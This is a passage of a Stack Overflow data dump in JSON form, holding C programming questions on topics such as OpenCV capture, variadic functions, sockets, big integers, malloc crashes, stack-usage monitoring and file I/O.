sizeof(uintmax_t) * CHAR_BIT</code>. Do you know a best way to solve it?</p>\n"},{"tags":["c","osx","opencv","firewire"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":470,"score":1,"question_id":10248201,"title":"OpenCV Capture from external camera","body":"<p>I'm currently writing an real time application using OpenCV and in the following case:\nI'm trying to capture an image from a HDV camera plugged in firewire 800.\nI have tried to loop on index used on cvCaptureFromCam,\nbut no camera can't be found (except the webcam).</p>\n\n<p>there is my code sample, it loop on index (escaping 0 cause it's the webcam's index) :</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>CvCapture* camera;\nint index;\nfor (index = 1; index &lt; 100; ++index) {\n    camera = cvCaptureFromCAM(index);\n    if (camera)\n        break;\n}    \nif (!camera)\n    abort();\n</code></pre>\n\n<p>On any time it stops on the abort.</p>\n\n<p>I'm compiling on OSX 10.7 and I have tested :</p>\n\n<ul>\n<li>OpenCV 1.2 private framework</li>\n<li>OpenCV 2.0 private framework (found here : <a href=\"http://vislab.cs.vt.edu/~vislab/wiki/images/4/44/OpenCV2.0.dmg\" rel=\"nofollow\">OpenCV2.0.dmg</a>)</li>\n<li>OpenCV compiled by myself (ver. 2)</li>\n</ul>\n\n<p>I know that the problem is knowned and there is a lot of discussion about this,\nbut I'm not able ti find any solution.</p>\n\n<p>Does anyone have been in the same case ?</p>\n\n<p>Regards.</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":13183524,"title":"function parameters `...` what does it mean?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1124265/what-does-mean-in-an-argument-list-in-c\">What does … mean in an argument list in C ?</a>  </p>\n</blockquote>\n\n\n\n<p>I was reading a book about win32 programming and i saw a function like this:  </p>\n\n<pre><code>   int CDECL MessageBoxprintf(TCHAR *szCaption,TCHAR *szFrmat,...)  \n   {\n       TCHAR szBuffer[1024];\n       va_list pArgList;\n       va_start (pArgList,szFrmat);\n      _vsnprintf(szBuffer,sizeof(szBuffer)/sizeof(TCHAR),szFrmat,pArgList);\n       va_end (pArgList);\n       return MessageBox(NULL,szBuffer,szCaption,0);\n    }\n</code></pre>\n\n<h3>what does <code>,...</code> means in the parameters of a function?</h3>\n\n<p>I tried to find answers with searching but i got nothing useful.  </p>\n"},{"tags":["c","send","options","receive","stock"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":41,"score":2,"question_id":13183585,"title":"Query to put in Simple C++ program to retrieve stock/options information using send(), recv() from yahoo","body":"<pre><code>.....\nhost = gethostbyname(X);\n.....\nSOCKADDR_IN SockAddr;                                                                \nSockAddr.sin_port=htons(80);\nSockAddr.sin_family=AF_INET;\nSockAddr.sin_addr.s_addr = *((unsigned long*)host-&gt;h_addr);\n\nconnect(Socket,(SOCKADDR*)(&amp;SockAddr),sizeof(SockAddr));\n......\nchar buffer[100000];\nsend(Socket,Y, strlen( Y ),0);\nint nDataLength = recv(Socket,buffer,100000,0);\n</code></pre>\n\n<p>Above is a simple code I am creating a socket which binds to the server X above.\nAfter that I want to send some messages Y to the server to get the desired options/options information. X refers to server which I can to connect to and Y refers to the querry/message i am sending to X.</p>\n\n<p>However, I got no knowledge in web protocol and got no idea what to put in X and Y.\nCan anybody help me with this?\nThank you very much</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":69,"score":3,"question_id":13182588,"title":"Storing and working with 300 digit integers","body":"<pre><code>int main()\n{\n    unsigned long long key = 21739827982173982173921739217392173217397213271832193721973291732917321732132173971317382173213782163872163872163872163872163826176728328621321487219372198371298775647326409817402198732198432974329479832749173821732198732173217392173721372193728193782193792173921732171;\n}\n</code></pre>\n\n<p>Compiler says the number I want to assign is too large for the type selected. How can I store this and then perform operations?</p>\n"},{"tags":["c","data-structures"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13183335,"title":"what kind of data structure should I use in this case?","body":"<p>I have a function, it is called inside a loop, it can generate a set of integer for each loop, for example: </p>\n\n<p>result for loop 1: <code>{1 1 1 2}</code> <br/>\nresult for loop 2: <code>{1 1 1 3}</code> <br/>\nresult for loop 3: <code>{2 1 1 3}</code> <br/>\nresult for loop 4: <code>{3 1 3 2}</code><br/></p>\n\n<p>and this function may generate duplication result, for example, result 2 and result 3 is the same. I need to put these results inside a data structure, but can not put the duplication, if the result 2 is the same as result 3, only one of them should be kept, how to achieve it in <code>C</code>?</p>\n"},{"tags":["c","gcc","linker","embedded","arm"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":13166252,"title":"GCC Error while compiling for ARM","body":"<p>I am getting the following error while trying to compile some code for an ARM Cortex-M4\nusing</p>\n\n<pre><code>gcc -mcpu=cortex-m4 arm.c  \n\n\n\n`-mcpu=' is deprecated. Use `-mtune=' or '-march=' instead.\narm.c:1: error: bad value (cortex-m4) for -mtune= switch\n</code></pre>\n\n<p>I was following <a href=\"http://gcc.gnu.org/onlinedocs/gcc-4.7.1/gcc/ARM-Options.html\" rel=\"nofollow\">GCC 4.7.1 ARM options</a>. Not sure whether I am missing some critical option. Any kickstart for using GCC for ARM will also be really helpful.</p>\n"},{"tags":["c++","c","com"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":13182924,"title":"using of extern \"C\" without function","body":"<p>I read the Dale Rogerson's book \"Inside COM\". In a chapter 5, he wrote (sorry, I translated in English):</p>\n\n<blockquote>\n  <p><i>extern \"C\"</i> is for C linkage. If <b>a function</b> is marked as <i>extern \"C\"</i>,\n  compiler wil not change function's name to other, for example:\n  <code>?CreateInstance@@YAPAUIUncnown@@XZ</code>.</p>\n</blockquote>\n\n<p>It is clear for me. But further the author uses <code>extern \"C\"</code> in other place and doesn't explain the reason of it:</p>\n\n<pre><code>#include &lt;objbase.h&gt;\n\nextern \"C\" \n{\n    // {32bb8320-b41b-11cf-a6bb-0080c7b2d682}\n    extern const IID IID_IX = \n        {0x32bb8320, 0xb41b, 0x11cf,\n        {0xa6, 0xbb, 0x0, 0x80, 0xc7, 0xb2, 0xd6, 0x82}} ;\n\n    // {32bb8321-b41b-11cf-a6bb-0080c7b2d682}\n    extern const IID IID_IY = \n        {0x32bb8321, 0xb41b, 0x11cf,\n        {0xa6, 0xbb, 0x0, 0x80, 0xc7, 0xb2, 0xd6, 0x82}} ;\n\n    // {32bb8322-b41b-11cf-a6bb-0080c7b2d682}\n    extern const IID IID_IZ = \n        {0x32bb8322, 0xb41b, 0x11cf,\n        {0xa6, 0xbb, 0x0, 0x80, 0xc7, 0xb2, 0xd6, 0x82}} ;\n\n    // The extern is required to allocate memory for C++ constants.\n}\n</code></pre>\n\n<p>It is not a function... Why author used <code>extern \"C\"</code> in this case?</p>\n\n<p>Best Regards,\nAndrey</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13182995,"title":"Using same array to store data repeatly","body":"<p>I'm reading data from a file word by word and trying to store in same buffer with space between every word. But words are coming out without space. Please tell me what is wrong?\noutput coming   aniljaiswalvikaskumarnikhilkumarindia  but i want space between each word.</p>\n\n<pre><code>int main()\n{\n    char buff[200];\n    int l=0;\n    FILE *fp;\n    fd = NULL;``\n    fp = fopen(\"header.c\",\"r\");\n    memset(buff,0,200);\n    while(1)\n    {\n        fscanf(fp,\"%s\",buff+l);\n        l=strlen(buff);\n        printf(\"Word of string = %s\\n\",buff);\n        printf(\"Length of string = %d\\n\",l);\n        if(feof(fp))\n        {\n            break;\n        }\n    }\n    fclose(fp);\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","unix","environment-variables","glib"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":36,"score":-1,"question_id":13181982,"title":"Set an enviroment variable from a process that will be visible by all proceses","body":"<p>How to set an enviroment variable from a process that will be visible by all processes ?\nI'm using C with Glib.</p>\n\n<p>I have 10 processes that use the same library. The problem is that in that library a checking procedure ( which is CPU hungry ) is performed. I want to avoid that library checking procedure to be executed for every process. For the first process that is using the library it will be enough.</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","exception","stack","int","addition"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12936521,"title":"C - Exception when using _int16","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12936798/correct-way-to-use-scanf-printf-and-family-with-fixed-size-types\">Correct way to use scanf / printf (and family) with fixed size types?</a>  </p>\n</blockquote>\n\n\n\n<p>I have written the following program in Visual Studio:</p>\n\n<p>Upon running the program and exiting, I get the error message \"stack around variable b was corrupted\".  If I replace _int 16 with int, no exception is raised.  How can I solve this problem please?  I have to use _int16 since I want to simulate an integer overflow.  Thanks :)</p>\n"},{"tags":["c","global-variables","borland"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13182949,"title":"psuedo global variable in c","body":"<p>An interview question asked very frequently. But, i'm not clear with the explanation, which i found on different websites. Because, when i'm trying to execute this code, then it shows <code>_AX</code> undeclared error.</p>\n\n<pre><code>main()\n  {\n   int i;\n   i = abc();\n   printf(\"%d\",i);\n  }\n  abc()\n  {\n   _AX = 1000;\n  } \n</code></pre>\n\n<p>people says <code>_AX</code> is the <strong>pseudo global variable</strong>, that's why it shows output <strong>1000</strong>. </p>\n\n<p>*<em>Note : - It showing error <code>_AX</code> undeclared, but when i declared the variable, then it shows some garbage value  *</em> </p>\n"},{"tags":["c","null","integer","termination"],"answer_count":7,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":133,"score":1,"question_id":13050987,"title":"C - Random characters after using strncpy() function","body":"<p>I have the following program in C:</p>\n\n<p>The main problem with the program is that after I perform the copy operation, a number of rubbish characters are displayed after the letters copied.  I know this is because the destination variable is NOT properly null-terminated.  However, if you inspect the code carefully, I am performing null-termination.  Why is the problem still there?</p>\n"},{"tags":["c++","c","fortran","fortran77","fortran95"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":13166645,"title":"Accessing text data files from a static library function","body":"<p>How to I enable a static library to pull in data available in ascii data files?</p>\n\n<p>I am trying to add a model to a simulation as a library which contains functions that read data from data files.  I am able to compile and run the functions from a main program outside the actual full simulation, but once I put the functions as a library on the host for the simulation the data no longer gets read.</p>\n\n<p>As the path to the data is changing depending on the user, I cannot provide an absolute data path to the ascii data files.  Is there a way to use objcopy to make the data files into object code in the library or how can I best access the data from my static library?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":2,"view_count":111,"score":1,"question_id":13182801,"title":"Simple C If Statement","body":"<p>I made a very simple C program that is supposed to count how many characters and words are in a string (I count words by checking how many spaces are in the text and one to it). The current code is the following (with no 'printf's to keep it shorter):</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    int character;\n    int words, characters = 0;\n    while ((character = getchar()) != '\\n') {\n        characters = ++characters;\n        if ((character == ' ') || (character == '\\d')) {\n            words = ++words;\n        } \n    } \n    return 0;\n}\n</code></pre>\n\n<p>My problem is that counting words do not work. I get an accurate count for characters, but words always gives me 2293576, and I cannot for the world figure out why.</p>\n\n<p>Can someone solve this mystery for me?</p>\n\n<p>Thank you for all your answers; I really appreciate the help.</p>\n\n<p>and sorry if my primitive skills made some of your heads hurt. I am a beginner but hopefully improve fast.</p>\n"},{"tags":["c","compiler-errors","cygwin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13182743,"title":"No sys/sendfile.h on Cygwin?","body":"<p>I'm trying to compile some C code on Cygwin which needs the sendfile.h. When I try to compile, it gives me </p>\n\n<pre><code>fatal error: sys/sendfile.h: No such file or directory\ncompilation terminated.\n</code></pre>\n\n<p>How do I solve this? Will I have to move to a linux platform? I have gcc4.5 installed on Cygwin. </p>\n"},{"tags":["c","compilation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13182604,"title":"making library: conflicting types in header and source file","body":"<p>I have trouble understanding c header files and source files. I have:</p>\n\n<p><strong>something.c</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"something.h\"\n\ntypedef struct {\n    int row, col;\n} point;\n\npoint\nwhereispoint(point **matrix, int rows, int cols)\n{\n   ..... Does something ....\n   printf(\"something...\");\n}\n</code></pre>\n\n<p><strong>something.h</strong></p>\n\n<pre><code>typedef struct point * p;\n\np whereispoint(p **matrix, int rows, int cols);\n</code></pre>\n\n<p><strong>main.c</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"something.h\"\n\nint\nmain(void)\n{\n   int row, col;\n   p **matrix=malloc(bla, bla);\n   .....Something.....\n   p=whereispoint(matrix, row, col);\n   return 0;\n}\n</code></pre>\n\n<p>Now when I don't actually know how to compile this... I tried <code>gcc -c main.c something.c</code>\nbut that doesn't work, I tried to compile separately <code>gcc -c main.c</code> and <code>gcc -c something.c</code>\nthen <strong>main.c</strong> works but <strong>something.c</strong> does not. </p>\n\n<p>I am actually trying to make a library out of something.c but as I am not able even to compile it to object code I don't know what to do. I guess there is something wrong with the struct type and the typedef of it in <strong>something.h</strong> but I can't figure out what... </p>\n"},{"tags":["c","posix"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":13182130,"title":"Are stdin/stderr guaranteed to be closed after process terminates?","body":"<p>I spawn a child process using pipe(), fork(), dup(), execve().</p>\n\n<p>From the parent, is it safe to wait for stdin and stdout of the child to close (i.e. read() return 0 on both), and then do waitpid() to collect the termination status?</p>\n\n<p>Or can it happen that the process will fail without ever closing stdin and stdout? (thus my program never getting to waitpid)</p>\n\n<hr>\n\n<p>To clarify, I'm asking whether the following is safe:</p>\n\n<pre><code>while (child_stdin != -1 &amp;&amp; child_stdout != -1) {\n    poll(...)\n\n    if (got_stdout) {\n        n = read(child_stdout);\n        if (n &gt;= 0) {\n            // do something with output\n        } else if (n == 0) {\n            child_stdout = -1\n        }\n    }\n\n    // same for stdin\n}\n\nwaitpid(child_pid)\n</code></pre>\n\n<p>Or can it happen that child will terminate, but I'll never get 0 on read() or write().</p>\n\n<p>No signals are involved, just poll()-ing.</p>\n"},{"tags":["c","floating-point","integer","double","endianness"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":51,"score":-2,"question_id":13182045,"title":"Inconsistent results while printing float as integer","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1632080/print-the-float-value-in-integer-in-c-language\">print the float value in integer in C language</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying out a rather simple code like this:</p>\n\n<pre><code>float a = 1.5;\nprintf(\"%d\",a);\n</code></pre>\n\n<p>It prints out <code>0</code>. However, for other values, like 1.4,1.21, etc, it is printing out a garbage value. Not only for 1.5, for 1.25, 1.5, 1.75, 1.3125 (in other words, decimal numbers which can be perfectly converted into binary form), it is printing <code>0</code>. What is the reason behind this? I found a similar post <a href=\"http://stackoverflow.com/questions/1632080/print-the-float-value-in-integer-in-c-language\">here</a>, and the first answer looks like an awesome answer, but I couldn't discern it. Can any body explain why is this happening? What has endian-ness got to do with t?</p>\n"},{"tags":["c++","c","math","precision"],"answer_count":0,"favorite_count":2,"up_vote_count":3,"down_vote_count":3,"view_count":73,"score":0,"question_id":13182531,"title":"What is a good open source high precision math library with a liberal license?","body":"<p>I'm looking for a good open source high precision math library, but with a liberal license (e.g. BSD/MIT). Ideally written in C, C++, or a similar derivative.</p>\n\n<p>I've looked at libraries like GMP , ttmath, and libtommath, but none meet the requirements; either they are GPL/LGPL, don't support rationals (or operations on them), etc.</p>\n\n<p>I'm wanting to work around the usual problem of floating-point precision loss, so ideally the class would support some form of rational number, along with all the common mathematical operations ( +,-,*,/,log,sin,cos, etc. ).</p>\n\n<p>My actual requirements are fairly \"simple\". I'd like to be able to make \"simple\" calculations such as 0.999999 - 0.999998 (and get the right result of 0.000001), or 2/6 (and get the result of 1/3). Operations such as log, sin, cos etc. are less important i.e. the usual double precision floating point is good enough - so if necessary, I can add these myself to a quality rational number class.</p>\n"},{"tags":["c","memory-management","stack"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13181910,"title":"Write magic bytes to the stack to monitor its usage","body":"<p>I have a problem on an embedded device that I think might be related to a stack overflow.</p>\n\n<p>In order to test this I was planning to fill the stack with magic bytes and then periodically check if the stack has overflowed by examining how much of my magic bytes that are left intact.</p>\n\n<p>But I can't get the routine for marking the stack to work. The application keeps crashing instantly. This is what I have done just at the entry point of the program.</p>\n\n<pre><code>    //fill most of stack with magic bytes\n    int stackvar = 0;\n    int stackAddr = (int)&amp;stackvar;\n    int stackAddrEnd = stackAddr - 25000;\n    BYTE* stackEnd = (BYTE*) stackAddrEnd;\n\n    for(int i = 0; i &lt; 25000; ++i)\n    {\n        *(stackEnd + i) = 0xFA;\n    }\n</code></pre>\n\n<p>Please note that the allocated stack is larger than 25k. So I'm counting on some stack space to already be used at this point. Also note that the stack grows from higher to lower addresses that's why I'm trying to fill from the bottom and up.</p>\n\n<p>But as I said, this will crash. I must be missing something here.</p>\n"},{"tags":["c","file","file-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":13181783,"title":"C File Handling - Integer Value 13 Cannot Be Written Into Files","body":"<p>I'm unable to write the integer value 13 into a file using any of the file handling functions available on C including <code>putw()</code>, <code>fprintf()</code>, and <code>fwrite()</code>.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\n\nvoid main()\n{\n  int i;\n  int arr[]={10, 11, 12, 13, 14, 15};\n  FILE *fp;\n  if (fp = fopen(\"test\", \"w\")) {\n        for(i=0; i&lt;6; i++) {\n            putw(arr[i], fp);\n        }\n  }\n  fclose(fp);\n  fp = fopen(\"test\", \"r\");\n  while ((i=getw(fp))!= EOF) {\n        printf(\"%d, \",i);\n  }\n  fclose(fp);\n  getch();\n}\n</code></pre>\n\n<p>gives an output   </p>\n\n<pre><code>10, 11, 12, 3584, 3840,\n</code></pre>\n\n<p>and a modified array</p>\n\n<pre><code>int arr[]={13, 11, 12, 13, 14, 15};\n</code></pre>\n\n<p>gives an output </p>\n\n<pre><code>2816, 3072, 0, 14, 15, \n</code></pre>\n\n<p>You can notice that the output is not as expected after encountering the <strong>value 13</strong>.\nCan anyone help me with this problem?</p>\n"},{"tags":["c","malloc","runtime-error","sigabrt","cgdb"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":55,"score":2,"question_id":13181241,"title":"SIGABRT in malloc.c, what the hell just happened?","body":"<p>I wrote this innocent piece of code, and results in such an evil error:</p>\n\n<pre><code>static char * prefixed( char * pref, char *str ) {\n    size_t newalloc_size = sizeof(char) * (strlen(pref) + strlen(str));\n    char * result = (char*) malloc( newalloc_size );\n    [...]\n</code></pre>\n\n<p>output from debug (cgdb):</p>\n\n<pre><code>Breakpoint 1, prefixed (pref=0x401345 \"Env: \", str=0x4012b5 \"Home\") at ./src/backend/os/env.c:77\n(gdb) s\n(gdb) p newalloc_size \n$1 = 9\n(gdb) s\nenvtest: malloc.c:2368: sysmalloc: Assertion `(old_top == (((mbinptr) (((char *) &amp;((av)-&gt;bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;=\n(unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 * (sizeof(size_t))) - 1)) &amp; ~((2 * (sizeof(size_t))) - 1))) &amp;&amp; ((old_top)-&gt;size &amp; 0x1) &amp;&amp; ((unsigned long)old_end &amp; pagemask) == 0)'\nfailed.\n\nProgram received signal SIGABRT, Aborted.\n0x00007ffff7a68fd5 in raise () from /usr/lib/libc.so.6\n(gdb)  \n</code></pre>\n\n<p>I checked the passed arguments, too. They where just as they are supposed to be:</p>\n\n<pre><code>Breakpoint 1, prefixed (pref=0x401345 \"Env: \", str=0x4012b5 \"Home\") at ./src/backend/os/env.c:77\n(gdb) p pref\n$2 = 0x401345 \"Env: \"\n(gdb) p strlen(pref)\n$3 = 5\n(gdb) p str\n$4 = 0x4012b5 \"Home\"\n(gdb) p strlen(str)\n$5 = 4\n(gdb) \n</code></pre>\n\n<p>can anybody imagine, what the hell goes wrong here? I know there are functions to cat two strings together, but I want to do it on my own!</p>\n\n<p>kind regards.</p>\n"},{"tags":["c","shell","command-line"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":251,"score":6,"question_id":9725675,"title":"Is there a \"standard\" format for command line/shell help text?","body":"<p>If not, is here a de facto standard? Basically I'm writing a command line help text like so:</p>\n\n<pre><code>usage: app_name [options] required_input required_input2\n  options:\n    -a, --argument     Does something\n    -b required     Does something with \"required\"\n    -c, --command required     Something else\n    -d [optlistitem1 optlistitem 2 ... ]     Something with list\n</code></pre>\n\n<p>I made that from basically just reading the help text of various tools, but is there a list of guidelines or something? For example, do I use square brackets or parenthesis? How are the spacing? What if the argument is a list? Thanks! </p>\n"},{"tags":["c","preprocessor"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":62,"score":5,"question_id":13179775,"title":"What does the preprocessor do with \"# <number> <filename>\"?","body":"<p>I've just encountered a C file which contains both preprocessor directives and lines that look like this:</p>\n\n<pre><code># 9 \"filename\"\n</code></pre>\n\n<p>I have never seen such lines before. What do they mean? I'm guessing these are preprocessor directives, but what does the preprocessor do with them?</p>\n\n<p>Also, for some of the lines the string doesn't even represent an existing filename...</p>\n"},{"tags":["java","c","debugging","jni","eclipse-cdt"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13123019,"title":"Attaching a process to a debug session: empty process list","body":"<ul>\n<li>Windows xp sp3</li>\n<li>Eclipse Junu with CDT</li>\n</ul>\n\n<p>I've been trying to debug a JNI project using the process attachment feature.\nAt first, I fire the Java program, and then, when I fire the C program, I suppose to choose the javaw.exe process.</p>\n\n<p><a href=\"https://community.jboss.org/wiki/DebuggingJNICAndJavaCodeInEclipse\" rel=\"nofollow\">The tutorial I used for JNI debugging</a></p>\n\n<p>The problam is, when I suppose to choose the right process, the process list seem to be empty:\n<img src=\"http://i.stack.imgur.com/xlAiD.jpg\" alt=\"Empty List\"></p>\n\n<p>Here is my debug configuration:\n<img src=\"http://i.stack.imgur.com/LeNSL.jpg\" alt=\"Debug Configuration\"></p>\n\n<p>What can I do? Should I replace the debugger?</p>\n\n<p>Thanks in advance,\nMark.</p>\n"},{"tags":["c","ansi"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13180304,"title":"pointers help appending","body":"<p>Can someone help me with this code. I need to append these two pointers together but its not working for me. The code does not add the pointers together. I think *mystrcat function is wrong please help </p>\n\n<pre><code>// stringAdds.cpp : Defines the entry point for the console application.\n//\n\nchar *mystrcat(char *s, char *p);\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    char myChar = 0;\n    int i = 0;\n\n    char *s = (char*) malloc (1);\n    char *p = (char*) malloc (1);\n\n    printf(\"Input s: \");\n    while ((myChar=getchar()) != '\\n')\n    s[i++]=myChar;\n    s[i]='\\0';\n    //scanf(\"%s\", &amp;s);\n    printf_s(\"%s\", s);\n\n    printf(\"\\nInput p: \");\n    i = 0;\n    while ((myChar=getchar()) != '\\n')\n    p[i++]=myChar;\n    p[i]='\\0';\n    printf_s(\"%s\\n\", p);\n\n    printf_s(\"return string: %s\", mystrcat(s,p));   \n}\n\nchar *mystrcat(char *s, char *p)\n{\n    int sizeOfs = 0;\n    int sizeOfp = 0;\n    int sizeZero = 0;\n\n    while(*s!='\\0')\n    {\n        sizeOfs++;\n    }\n    while(*p!='\\0')\n    {\n        sizeOfp++;\n    }\n    for( int i=0; i&lt;sizeOfp; i++) \n        {\n            s[sizeOfs++]=p[sizeZero++];\n        }\n    s[sizeOfs]='\\0';\n\n    return s;\n}\n</code></pre>\n"},{"tags":["javascript","c","node.js","parsing","compiler"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":86,"score":2,"question_id":13171616,"title":"C parser in Javascript","body":"<p>I'd like to parse C header files in Javascript. Is there any such library available? Otherwise, any tips to help me get started?</p>\n\n<p><strong>Update:</strong> My ultimate goal is to automatically build interfaces for <a href=\"https://github.com/rbranson/node-ffi\" rel=\"nofollow\">node-ffi</a>. The parser doesn't necessarily have to be in Javascript as long as it can spit out a format understandable by Javascript. If it's very hard to develop by myself, I'll probably have to go with an off the shelf solution...?</p>\n"},{"tags":["c","compiler","kernel","glibc","standard-library"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":94,"score":3,"question_id":13179102,"title":"How do the standard C library and system calls work together?","body":"<p>I recently got interested about inner workings of compilers, standard libraries and kernels. While I was searching for the source code of the standard C library, I came across with Glibc. But what it says in Glibc's official website is: <code>the library which defines the ''system calls'' and other basic facilities such as open, malloc, printf, exit...</code> </p>\n\n<p>So I guess that Glibc actually doesn't provide the source code of the standard C library, but instead provides the system calls for those functions, and then the kernel takes care of them, am I right? </p>\n\n<p>I would like to learn more about those things. For example, how do the <code>sin</code>, <code>printf</code>, and <code>strlen</code>, functions get executed in C programs? If Glibc provides just the system calls, where are the actual source codes of those functions? How does the kernel execute them? Where can be found the source code of the part of the kernel that executes those functions?</p>\n"},{"tags":["c","validation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":98,"score":0,"question_id":13178114,"title":"Loop to check for duplicate number","body":"<p>I need some advice (not the answer).</p>\n\n<p>My current assignment requires that I check (int first, int second...int fifth), for duplicate numbers using int pick.</p>\n\n<p>User is to enter 2 numbers (one number is a range from 1-100 and the second number is 1-6), then i randomize the output by using the information they provide</p>\n\n<p>Example\nNum1 = 49\nNum2 = 3\nOutput: 4, 40, 30.</p>\n\n<p>I need a way to check if \"pick\" (the random number generated), does not duplicate against int first, int second and so on.  </p>\n\n<p>I can use a bunch of if statements to validate pick vs first, second etc.  I'd like not to do this as it is way to much code.  I was wondering if there is a way that I could use a loop to do this?</p>\n\n<p>Any advice would be appreciated, this is homework, but I'm not looking for the answer just a hint or advice.</p>\n\n<p>I can post some code i have if need be.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\n\n\nint validate(int low, int high) {\n    int flag = 0, number = 0;\n    do \n    {\n        scanf(\" %d\", &amp;number);\n        if (number &lt;= low || number &gt; high) \n        {\n            printf(\"INVALID! Must enter a value between %d and %d: \", low, high);\n        }\n        else {\n            flag = 1;\n        }\n    } while(flag == 0);\n    return number;\n}\n\nint getRand(int max) {\n    int number, i;\n    number = rand() % max + 1;\n    return number;\n}\nint validatePick(int pick, int first, int second, int third, int fourth, int fifth) {\n    int valid;\n\n    do {\n        if (pick \n\n}\nvoid prnt(int qty, int first, int second, int third, int fourth, int fifth, int sixth);\nint sort2(int *n1, int *n2);\n\n\nmain () {\n    int num1, num2, count = 0;\n    int pick, first = second = third = fourth = fifth = 0;\n\n    printf(\"LOTTERY GENERATOR\\n\");\n    printf(\"Enter the maximum value between 1 and 100: \");\n    num1 = validate(1,100);\n    printf(\"Enter quantity of numbers to pick, between 1 and 6: \");\n    num2 = validate(1, 6);\n\n    srand(time(NULL));\n    printf(\"Picks: %c\", ' ');\n    while (count &lt; num2) {\n        getRand(num1);\n\n        count++;\n    }\n}\n</code></pre>\n"},{"tags":["python","c","set"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":13179605,"title":"is there an equivalent in C of python's set()?","body":"<p>I m seeking some equivalent in C of python's set() variable type\nany ideas?\nhere is the python doc about sets <a href=\"http://docs.python.org/2/library/sets.html\" rel=\"nofollow\">http://docs.python.org/2/library/sets.html</a></p>\n\n<p>and could you explain/link me a help for this? please</p>\n"},{"tags":["android","c++","c","android-ndk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13179070,"title":"Get EMEI or phone ID from NDK","body":"<p>How can I get the phone EMEI or the phone ID from ndk support.</p>\n\n<p>Is there any other unique information from the device that I can use?</p>\n"},{"tags":["c++","c"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":5,"view_count":191,"score":-2,"question_id":13175862,"title":"What is better for(;;) {} or while(true) {}?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2611246/is-for-faster-than-while-true-if-not-why-do-people-use-it\">Is “for(;;)” faster than “while (TRUE)”? If not, why do people use it?</a>  </p>\n</blockquote>\n\n\n\n<p>I would like to know which infinite loop is more preferable:</p>\n\n<pre><code>for(;;) {\n    // Do some stuff\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>#define TRUE 1\n\nwhile(TRUE) {\n    // Do some stuff\n}\n</code></pre>\n\n<p>Is there any difference between them from the performance point of view?</p>\n\n<p>What is more preferable from coding standards point of 